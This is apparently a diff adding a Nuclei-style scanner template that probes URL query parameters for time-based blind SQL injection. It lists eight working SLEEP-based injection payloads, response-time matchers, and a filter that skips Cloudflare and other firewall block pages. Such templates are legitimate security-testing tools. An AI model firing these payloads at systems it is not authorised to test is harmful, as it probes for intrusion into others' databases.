@@ -1,0 +1,53 @@
+id: blind-based-sqli
+
+info:
+  name: Blind based sqli
+  author: rix4uni
+  severity: critical
+  description: url test for blind sleep payloads. 
+  tags: sqli,blind
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      reflection:
+        - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
+        - "(SELECT*FROM(SELECT(SLEEP(10)))a)"
+        - "if(now()=sysdate(),sleep(8),0)"
+        - "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"
+        - "XOR(if(now()=sysdate(),sleep(7),0))XOR"
+        - "'XOR(if(now()=sysdate(),sleep(3*4),0))OR'"
+        - "0' OR SLEEP(9) -- -"
+        - "' OR SLEEP(14) OR '"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{reflection}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=7 && duration<=8"
+          - "duration>=10 && duration<=11"
+          - "duration>=8 && duration<=9"
+          - "duration>=12 && duration<=13"
+          - "duration>=9 && duration<=10"
+          - "duration>=14 && duration<=15"
+
+      - type: word
+        words:
+          - "Access Denied"
+          - "Error 1006"
+          - "Cloudflare"
+          - "403 Forbidden"
+        condition: or
+        part: body
+        negative: true
